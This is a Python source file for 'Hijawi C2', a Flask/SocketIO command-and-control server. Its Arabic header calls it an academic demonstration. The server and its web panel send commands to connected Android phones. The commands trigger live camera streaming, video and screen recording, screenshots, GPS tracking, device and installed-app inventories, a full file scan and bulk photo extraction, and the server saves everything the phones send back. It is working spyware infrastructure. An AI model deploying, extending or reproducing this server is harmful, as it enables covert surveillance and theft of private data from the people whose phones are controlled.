#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
server_final_working_apk.py
================================================================================
سيرفر C2 متكامل للعرض الأكاديمي
================================================================================
"""

from flask import Flask, render_template_string, jsonify, request
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import cv2
import numpy as np
import base64
import threading
import time
import json
import os
from datetime import datetime
from collections import defaultdict
from pathlib import Path

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORS = True
except:
    COLORS = False
    class Fore: GREEN=CYAN=YELLOW=RED=MAGENTA=BLUE=WHITE=''
    class Style: BRIGHT=DIM=NORMAL=''

app = Flask(__name__)
app.config['SECRET_KEY'] = 'hijawi_final_working_key'
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', ping_timeout=60, ping_interval=25)

MAX_CHUNK_TIMEOUT = 300
CLEANUP_INTERVAL = 60
OUTPUT_DIR = Path("received_data")
for sub in ["videos", "photos", "screenshots", "screen_records", "logs"]:
    (OUTPUT_DIR / sub).mkdir(parents=True, exist_ok=True)

connected_clients = {}
video_chunks = {}
photo_chunks = {}
screen_chunks = {}
current_frame = None
frame_lock = threading.Lock()
stats = {'total_connections':0, 'total_videos':0, 'total_photos':0, 'total_screenshots':0, 'total_commands':0}

def cleanup_expired():
    now = time.time()
    for sid in list(video_chunks.keys()):
        if now - video_chunks[sid].get('created_at',0) > MAX_CHUNK_TIMEOUT:
            del video_chunks[sid]
    for sid in list(photo_chunks.keys()):
        if now - photo_chunks[sid].get('created_at',0) > MAX_CHUNK_TIMEOUT:
            del photo_chunks[sid]
    for sid in list(screen_chunks.keys()):
        if now - screen_chunks[sid].get('created_at',0) > MAX_CHUNK_TIMEOUT:
            del screen_chunks[sid]
    for sid in list(connected_clients.keys()):
        if now - connected_clients[sid].get('last_seen',0) > 180:
            del connected_clients[sid]
def cleanup_loop():
    while True:
        time.sleep(CLEANUP_INTERVAL)
        cleanup_expired()
threading.Thread(target=cleanup_loop, daemon=True).start()

def video_display():
    global current_frame
    cv2.namedWindow("Live Stream - Hijawi C2", cv2.WINDOW_NORMAL)
    cv2.resizeWindow("Live Stream - Hijawi C2", 1024, 768)
    while True:
        with frame_lock:
            if current_frame is not None:
                cv2.imshow("Live Stream - Hijawi C2", current_frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
    cv2.destroyAllWindows()
threading.Thread(target=video_display, daemon=True).start()

def send_command(sid, command, params=None):
    if sid not in connected_clients:
        return False, "Client not found"
    socketio.emit('command', {'cmd': command.upper(), 'params': params or {}}, room=sid)
    stats['total_commands'] += 1
    return True, "Sent"
def broadcast_command(command, params=None):
    if not connected_clients:
        return False, "No clients"
    for sid in list(connected_clients.keys()):
        send_command(sid, command, params)
    return True, f"Sent to {len(connected_clients)} clients"

def process_chunks(chunks_dict, data, typ):
    sid = request.sid
    if sid not in chunks_dict:
        chunks_dict[sid] = {'chunks':{}, 'total':data['total_chunks'], 'created_at':time.time()}
        if 'filename' in data:
            chunks_dict[sid]['filename'] = data['filename']
        if 'total_photos' in data:
            chunks_dict[sid]['total_photos'] = data['total_photos']
    chunks_dict[sid]['chunks'][data['chunk_index']] = data['chunk']
    if len(chunks_dict[sid]['chunks']) == data['total_chunks']:
        full = ''.join(chunks_dict[sid]['chunks'][i] for i in sorted(chunks_dict[sid]['chunks'].keys()))
        data_bytes = base64.b64decode(full)
        ts = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        if typ == 'video':
            path = OUTPUT_DIR / 'videos' / f"video_{ts}.mp4"
            stats['total_videos'] += 1
        elif typ == 'photo':
            path = OUTPUT_DIR / 'photos' / f"photos_{ts}.zip"
            stats['total_photos'] += 1
        elif typ == 'screen':
            path = OUTPUT_DIR / 'screen_records' / f"screen_{ts}.mp4"
        else:
            path = OUTPUT_DIR / f"unknown_{ts}.bin"
        with open(path, 'wb') as f:
            f.write(data_bytes)
        print(f"{Fore.GREEN}[✓] Saved {typ}: {path.name} ({len(data_bytes)/1024/1024:.2f} MB){Style.RESET_ALL}")
        if typ == 'photo' and 'total_photos' in chunks_dict[sid]:
            print(f"    └─ {chunks_dict[sid]['total_photos']} photos")
        del chunks_dict[sid]

@socketio.on('connect')
def on_connect():
    connected_clients[request.sid] = {
        'device':'Unknown','ready':False,'last_seen':time.time(),
        'connected_at':datetime.now().isoformat(), 'last_location':None
    }
    stats['total_connections'] += 1
    print(f"{Fore.GREEN}[✓] New client connected: {request.sid}{Style.RESET_ALL}")
    emit('clients_update', {'clients':{sid:{'device':info['device'],'ready':info['ready']} for sid,info in connected_clients.items()}}, broadcast=True)

@socketio.on('client_ready')
def on_ready(data):
    sid = request.sid
    if sid in connected_clients:
        connected_clients[sid]['device'] = data.get('device','Unknown')
        connected_clients[sid]['ready'] = True
        connected_clients[sid]['last_seen'] = time.time()
        print(f"{Fore.GREEN}[✓] Client ready: {data['device']}{Style.RESET_ALL}")
    emit('clients_update', {'clients':{sid:{'device':info['device'],'ready':info['ready']} for sid,info in connected_clients.items()}}, broadcast=True)

@socketio.on('heartbeat')
def on_heartbeat(_):
    if request.sid in connected_clients:
        connected_clients[request.sid]['last_seen'] = time.time()

@socketio.on('location_update')
def on_location(data):
    sid = request.sid
    if sid in connected_clients:
        connected_clients[sid]['last_location'] = data
        connected_clients[sid]['last_seen'] = time.time()
    dev = connected_clients.get(sid,{}).get('device','Unknown')
    print(f"{Fore.CYAN}[📍] Location from {dev}: {data.get('lat',0):.6f}, {data.get('lon',0):.6f}{Style.RESET_ALL}")
    emit('location_broadcast', {'sid':sid, 'device':dev, 'location':data}, broadcast=True)

@socketio.on('video_frame')
def on_video(data):
    global current_frame
    try:
        img = base64.b64decode(data['image'])
        np_arr = np.frombuffer(img, np.uint8)
        frame = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)
        if frame is not None:
            with frame_lock:
                current_frame = frame
    except:
        pass

@socketio.on('command_response')
def on_response(data):
    sid = request.sid
    dev = connected_clients.get(sid,{}).get('device','Unknown')
    status = data.get('status','unknown')
    print(f"{Fore.YELLOW}[📱] Response from {dev}: {status}{Style.RESET_ALL}")
    emit('client_response', {'sid':sid, 'device':dev, **data}, broadcast=True)

@socketio.on('device_info_update')
def on_device_info(data):
    sid = request.sid
    dev = connected_clients.get(sid,{}).get('device','Unknown')
    print(f"{Fore.MAGENTA}[📱] Device info from {dev}:{Style.RESET_ALL}")
    print(f"    Model: {data.get('model')}, Android: {data.get('android_version')}, Battery: {data.get('battery')}%")
    fpath = OUTPUT_DIR / 'logs' / f"device_{dev}_{int(time.time())}.json"
    with open(fpath, 'w') as f:
        json.dump(data, f, indent=2)

@socketio.on('installed_apps_list')
def on_apps(data):
    sid = request.sid
    dev = connected_clients.get(sid,{}).get('device','Unknown')
    print(f"{Fore.BLUE}[📦] Installed apps from {dev}: {data.get('total',0)} apps{Style.RESET_ALL}")
    fpath = OUTPUT_DIR / 'logs' / f"apps_{dev}_{int(time.time())}.json"
    with open(fpath, 'w') as f:
        json.dump(data, f, indent=2)

@socketio.on('file_scan_results')
def on_filescan(data):
    sid = request.sid
    dev = connected_clients.get(sid,{}).get('device','Unknown')
    print(f"{Fore.CYAN}[🔍] File scan from {dev}: {data.get('total_files',0)} files{Style.RESET_ALL}")
    fpath = OUTPUT_DIR / 'logs' / f"filescan_{dev}_{int(time.time())}.json"
    with open(fpath, 'w') as f:
        json.dump(data, f, indent=2)

@socketio.on('extraction_progress')
def on_progress(data):
    emit('extraction_progress_update', data, broadcast=True)

@socketio.on('video_recording_chunk')
def on_video_chunk(data):
    process_chunks(video_chunks, data, 'video')

@socketio.on('photos_zip_chunk')
def on_photo_chunk(data):
    process_chunks(photo_chunks, data, 'photo')

@socketio.on('screen_recording_chunk')
def on_screen_chunk(data):
    process_chunks(screen_chunks, data, 'screen')

@socketio.on('screenshot_data')
def on_screenshot(data):
    try:
        img = base64.b64decode(data['image'])
        ts = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        path = OUTPUT_DIR / 'screenshots' / f"screenshot_{ts}.png"
        with open(path, 'wb') as f:
            f.write(img)
        stats['total_screenshots'] += 1
        print(f"{Fore.GREEN}[📸] Screenshot saved: {path.name} ({len(img)/1024:.1f} KB){Style.RESET_ALL}")
        emit('saved_file_notification', {'filename':path.name, 'size_mb':round(len(img)/1024/1024,2)}, broadcast=True)
    except Exception as e:
        print(f"{Fore.RED}[!] Screenshot error: {e}{Style.RESET_ALL}")

@socketio.on('disconnect')
def on_disconnect():
    sid = request.sid
    if sid in connected_clients:
        dev = connected_clients[sid].get('device','Unknown')
        print(f"{Fore.RED}[!] Client disconnected: {dev}{Style.RESET_ALL}")
        del connected_clients[sid]
    for d in (video_chunks, photo_chunks, screen_chunks):
        d.pop(sid, None)
    emit('clients_update', {'clients':{sid:{'device':info['device'],'ready':info['ready']} for sid,info in connected_clients.items()}}, broadcast=True)

@socketio.on('request_clients')
def on_req_clients():
    emit('clients_update', {'clients':{sid:{'device':info['device'],'ready':info['ready']} for sid,info in connected_clients.items()}})

@socketio.on('c2_command')
def on_c2_command(data):
    target = data.get('target_sid', 'broadcast')
    cmd = data.get('command', '')
    params = data.get('params', {})
    if target == 'broadcast':
        ok, msg = broadcast_command(cmd, params)
    else:
        ok, msg = send_command(target, cmd, params)
    emit('command_status', {'status':'sent' if ok else 'error', 'message':msg})

HTML_PANEL = '''<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Hijawi C2 - Final Working Version</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px;}
        h1{color:#f44;text-align:center;margin-bottom:10px;}
        .container{max-width:1300px;margin:auto;}
        .stats{background:#111;padding:15px;display:flex;gap:20px;margin-bottom:20px;border-radius:8px;}
        .stat{flex:1;text-align:center;}
        .stat-value{font-size:28px;color:#f44;}
        .client-panel{background:#111;padding:15px;border-radius:8px;margin-bottom:20px;}
        select,button,input{background:#222;border:1px solid #444;color:#0f0;padding:8px;border-radius:5px;}
        .cmd-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px;margin:20px 0;}
        .cmd-btn{background:#1a1a1a;border:1px solid #333;padding:12px;text-align:center;cursor:pointer;border-radius:6px;}
        .cmd-btn:hover{background:#f44;color:#000;}
        .params-panel{background:#0a0a0a;border:1px solid #333;border-radius:8px;padding:15px;margin:15px 0;}
        .log-panel{background:#000;height:300px;overflow-y:auto;padding:10px;font-size:12px;margin-top:20px;border-radius:8px;}
        .log-entry{border-bottom:1px solid #111;margin:5px 0;}
        .camera-selector{margin-bottom:15px;}
        hr{border-color:#333;}
    </style>
</head>
<body>
<div class="container">
    <h1>🔴 HIJawi C2 - Final Working Version 🔴</h1>
    <div class="stats">
        <div class="stat"><div class="stat-value" id="clientCount">0</div><div>Clients</div></div>
        <div class="stat"><div class="stat-value" id="activeClient">—</div><div>Target</div></div>
        <div class="stat"><div class="stat-value" id="lastLoc">—</div><div>Location</div></div>
    </div>
    <div class="client-panel">
        <select id="targetSelect" style="width:100%"><option value="broadcast">📡 ALL CLIENTS</option></select>
    </div>
    <div class="params-panel camera-selector">
        <h4>📷 Camera Selection (for Stream & Recording)</h4>
        <label><input type="radio" name="camera" value="back" checked> Back Camera (default)</label>
        <label style="margin-left:20px;"><input type="radio" name="camera" value="front"> Front Camera (selfie)</label>
    </div>
    <div class="cmd-grid">
        <div class="cmd-btn" id="startStreamBtn">▶ START STREAM</div>
        <div class="cmd-btn" id="stopStreamBtn">⏹ STOP STREAM</div>
        <div class="cmd-btn" id="screenshotBtn">📸 SCREENSHOT</div>
        <div class="cmd-btn" id="locationBtn">📍 GET LOCATION</div>
        <div class="cmd-btn" id="deviceInfoBtn">📱 DEVICE INFO</div>
        <div class="cmd-btn" id="appsBtn">📦 INSTALLED APPS</div>
        <div class="cmd-btn" id="scanBtn">🔍 SCAN FILES</div>
    </div>
    <div class="params-panel">
        <h4>🎥 RECORD VIDEO</h4>
        Duration: <input type="number" id="recDur" value="10" min="1" max="120" style="width:70px">
        Quality: <select id="recQuality"><option value="low">Low</option><option value="medium" selected>Medium</option><option value="high">High</option></select>
        <button id="recordBtn">START RECORDING</button>
    </div>
    <div class="params-panel">
        <h4>📱 SCREEN RECORD (Simulated)</h4>
        Duration: <input type="number" id="scrDur" value="30" min="5" max="180" style="width:70px">
        <button id="screenRecordBtn">START SCREEN RECORD</button>
    </div>
    <div class="params-panel">
        <h4>📁 EXTRACT ALL PHOTOS</h4>
        <button id="extractBtn">EXTRACT & ZIP</button> <span id="extractStatus"></span>
    </div>
    <div class="log-panel" id="logPanel">
        <div class="log-entry">[+] C2 Server Ready with Camera Selection</div>
    </div>
</div>
<script>
    const socket = io();
    let selectedSid = 'broadcast';
    function addLog(msg, type='info'){
        const log = document.getElementById('logPanel');
        const div = document.createElement('div');
        div.className = 'log-entry';
        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
        log.appendChild(div);
        div.scrollIntoView({behavior:'smooth',block:'nearest'});
    }
    function getSelectedCamera(){
        return document.querySelector('input[name="camera"]:checked').value;
    }
    function sendCommand(cmd, params={}){
        socket.emit('c2_command', {target_sid: selectedSid, command: cmd, params: params});
        addLog(`📡 Sending ${cmd} to ${selectedSid==='broadcast'?'ALL':selectedSid}`);
    }
    socket.on('clients_update', (data)=>{
        const sel = document.getElementById('targetSelect');
        sel.innerHTML = '<option value="broadcast">📡 ALL CLIENTS</option>';
        for(const [sid,info] of Object.entries(data.clients)){
            sel.innerHTML += `<option value="${sid}">📱 ${info.device}</option>`;
        }
        document.getElementById('clientCount').innerText = Object.keys(data.clients).length;
    });
    socket.on('location_broadcast', (data)=>{
        if(data.location.lat && data.location.lon){
            document.getElementById('lastLoc').innerHTML = `${data.location.lat.toFixed(4)}, ${data.location.lon.toFixed(4)}`;
            addLog(`📍 ${data.device}: ${data.location.lat}, ${data.location.lon}`);
        }
    });
    socket.on('client_response', (data)=>{
        addLog(`📱 Response from ${data.device}: ${data.status}`);
    });
    socket.on('extraction_progress_update', (data)=>{
        document.getElementById('extractStatus').innerHTML = `${data.message} (${data.progress}%)`;
        if(data.progress>=100) setTimeout(()=>document.getElementById('extractStatus').innerHTML='',5000);
    });
    document.getElementById('targetSelect').addEventListener('change', (e)=>{ selectedSid = e.target.value; addLog(`Target changed to ${e.target.options[e.target.selectedIndex].text}`); });
    document.getElementById('startStreamBtn').onclick = ()=>{ sendCommand('START_STREAM', {camera: getSelectedCamera()}); };
    document.getElementById('stopStreamBtn').onclick = ()=>{ sendCommand('STOP_STREAM'); };
    document.getElementById('screenshotBtn').onclick = ()=>{ sendCommand('TAKE_SCREENSHOT'); };
    document.getElementById('locationBtn').onclick = ()=>{ sendCommand('GET_LOCATION'); };
    document.getElementById('deviceInfoBtn').onclick = ()=>{ sendCommand('GET_DEVICE_INFO'); };
    document.getElementById('appsBtn').onclick = ()=>{ sendCommand('GET_INSTALLED_APPS'); };
    document.getElementById('scanBtn').onclick = ()=>{ sendCommand('SCAN_ALL_FILES'); };
    document.getElementById('recordBtn').onclick = ()=>{
        const dur = parseInt(document.getElementById('recDur').value)||10;
        const qual = document.getElementById('recQuality').value;
        const cam = getSelectedCamera();
        sendCommand('RECORD_VIDEO', {duration: dur, quality: qual, camera: cam});
    };
    document.getElementById('screenRecordBtn').onclick = ()=>{
        const dur = parseInt(document.getElementById('scrDur').value)||30;
        sendCommand('START_SCREEN_RECORD', {duration: dur});
    };
    document.getElementById('extractBtn').onclick = ()=>{ sendCommand('EXTRACT_ALL_PHOTOS'); addLog('📸 Starting photo extraction...'); };
    socket.emit('request_clients');
    addLog('✅ Panel ready - you can switch camera before streaming/recording');
</script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_PANEL)

@app.route('/api/stats')
def api_stats():
    return jsonify({'stats':stats, 'connected':len(connected_clients)})

if __name__ == '__main__':
    print(r"""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     🔴 HIJawi C2 - FINAL WORKING VERSION 🔴                     ║
    ║                                                                  ║
    ║  [✓] Full C2 Control with Camera Selection                     ║
    ║  [✓] Video Streaming, Recording, Screenshot, GPS               ║
    ║  [✓] Photo Extraction, App List, File Scan                     ║
    ║  [✓] Memory Cleanup, Auto Reconnect                            ║
    ║                                                                  ║
    ║  🌐 http://localhost:5000                                       ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)